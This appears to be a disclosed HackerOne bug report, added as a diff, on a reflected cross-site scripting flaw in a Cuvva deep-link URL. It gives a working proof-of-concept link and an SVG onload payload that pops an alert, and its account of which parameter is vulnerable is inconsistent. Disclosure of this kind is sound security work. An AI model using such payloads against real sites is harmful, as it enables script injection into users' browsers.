@@ -1,0 +1,32 @@
+ReportLink:https://hackerone.com/reports/230681
+WeaknessName:Cross-site Scripting (XSS) - Reflected
+Reporter:https://hackerone.com/jrpeg
+ReportedTo:Cuvva(cuvva)
+BountyAmount:
+Severity:medium
+State:Closed
+DateOfDisclosure:02.06.2017 12:14:37
+
+Summary:
+
+Date: 22th May 2017
+Browser: Firefox (50)
+Parameter: __branch_flow_id
+Authenticated: No
+
+Details:
+Arbitrary javascript can be injected in the home search bar.
+The search parameter called sort is vulnerable.
+
+POC:
+https://cuvva-alternate.app.link/ITHZI8FrKB?__branch_flow_type=deepview_tmta&__branch_flow_id=39519535523160176677%22%3e%3Csvg/onload=alert``%3E&__branch_desktop_deepview_type=1
+
+injection used:
+%22%3e%3Csvg/onload=alert``%3E
+
+-) Load the POC in your broswer
+-) Observe the alert box
+
+
+Thanks,
+JRPEG
